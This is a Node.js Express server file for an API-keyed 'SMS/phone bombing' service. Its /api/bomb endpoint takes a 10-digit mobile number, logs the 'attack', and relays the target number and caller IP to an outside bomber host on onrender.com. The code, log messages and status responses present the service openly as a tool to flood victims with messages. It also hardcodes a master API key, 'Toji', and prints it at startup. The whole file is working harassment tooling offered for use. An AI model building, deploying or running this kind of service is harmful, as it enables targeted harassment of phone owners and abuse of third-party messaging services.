const express = require('express');
const axios = require('axios');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const morgan = require('morgan');
const helmet = require('helmet');
const crypto = require('crypto');
const { MongoClient, ObjectId } = require('mongodb');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Database setup
let db;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017';
const DB_NAME = 'sukuna_api';

async function connectDB() {
    try {
        const client = new MongoClient(MONGODB_URI);
        await client.connect();
        db = client.db(DB_NAME);
        
        // Initialize main key if not exists
        const mainKey = await db.collection('api_keys').findOne({ key: "Toji" });
        if (!mainKey) {
            await db.collection('api_keys').insertOne({
                key: "Toji",
                owner: "System Admin",
                requests: 0,
                limit: 10000,
                createdAt: new Date(),
                isActive: true,
                isMaster: true
            });
        }
        
        console.log("✅ Database connected");
    } catch (error) {
        console.error("Database connection error:", error);
    }
}

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json());
app.use(morgan('combined'));

// Rate limiting
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: async (req) => {
        const apiKey = req.headers['x-api-key'] || 
                       req.headers['authorization']?.replace('Bearer ', '');
        if (apiKey) {
            const keyData = await db.collection('api_keys').findOne({ key: apiKey });
            return keyData ? keyData.limit : 100;
        }
        return 100;
    },
    message: {
        success: false,
        error: "Rate limit exceeded"
    }
});

// API Key validation middleware
const validateApiKey = async (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || 
                   req.headers['authorization']?.replace('Bearer ', '');
    
    if (!apiKey) {
        return res.status(401).json({
            success: false,
            error: "API key required"
        });
    }
    
    const keyData = await db.collection('api_keys').findOne({ key: apiKey });
    
    if (!keyData) {
        return res.status(401).json({
            success: false,
            error: "Invalid API key"
        });
    }
    
    if (!keyData.isActive) {
        return res.status(403).json({
            success: false,
            error: "API key is deactivated"
        });
    }
    
    // Update request count
    await db.collection('api_keys').updateOne(
        { key: apiKey },
        { $inc: { requests: 1 } }
    );
    
    // Store in request log
    await db.collection('request_logs').insertOne({
        apiKey: apiKey,
        endpoint: req.path,
        ip: getClientIp(req),
        method: req.method,
        timestamp: new Date()
    });
    
    req.apiKeyData = keyData;
    next();
};

// Get client IP
const getClientIp = (req) => {
    return req.headers['x-forwarded-for']?.split(',')[0] || 
           req.headers['x-real-ip'] || 
           req.ip;
};

// Main bombing endpoint
app.post('/api/bomb', apiLimiter, validateApiKey, async (req, res) => {
    try {
        const { phone, iterations = 1 } = req.body;
        
        // Input validation
        if (!phone) {
            return res.status(400).json({
                success: false,
                error: "Phone number is required"
            });
        }
        
        const cleanedPhone = phone.toString().replace(/\D/g, '');
        if (cleanedPhone.length !== 10 || !/^[6-9]/.test(cleanedPhone)) {
            return res.status(400).json({
                success: false,
                error: "Invalid phone number"
            });
        }
        
        const iterNum = Math.min(Math.max(parseInt(iterations) || 1, 1), 10);
        const clientIp = getClientIp(req);
        const requestId = crypto.randomBytes(12).toString('hex');
        
        // Log attack
        const attackLog = {
            requestId: requestId,
            phone: cleanedPhone,
            ip: clientIp,
            iterations: iterNum,
            apiKey: req.apiKeyData.key,
            status: 'initiated',
            timestamp: new Date()
        };
        
        await db.collection('attack_logs').insertOne(attackLog);
        
        // Process attack in background
        setTimeout(async () => {
            try {
                await axios.post('https://aivoratechbomber-2077.onrender.com/api/bomb', {
                    phone: cleanedPhone,
                    ip: clientIp,
                    iterations: iterNum
                });
                
                await db.collection('attack_logs').updateOne(
                    { requestId: requestId },
                    { $set: { status: 'completed', completedAt: new Date() } }
                );
                
            } catch (error) {
                await db.collection('attack_logs').updateOne(
                    { requestId: requestId },
                    { $set: { status: 'failed', error: error.message } }
                );
            }
        }, 100);
        
        // Immediate response
        res.json({
            success: true,
            message: "Attack deployed successfully",
            data: {
                requestId: requestId,
                target: cleanedPhone,
                iterations: iterNum,
                status: "processing",
                estimatedTime: "1-3 minutes"
            }
        });
        
    } catch (error) {
        console.error("Attack error:", error);
        res.status(500).json({
            success: false,
            error: "Attack deployment failed"
        });
    }
});

// Key management endpoints...

// Start server
connectDB().then(() => {
    app.listen(PORT, () => {
        console.log(`
        🚀 Sukuna API Server v2.0
        📍 Port: ${PORT}
        🔑 Main Key: Toji
        📊 Database: Connected
        
        Use 'Toji' as your API key to get started!
        `);
    });
});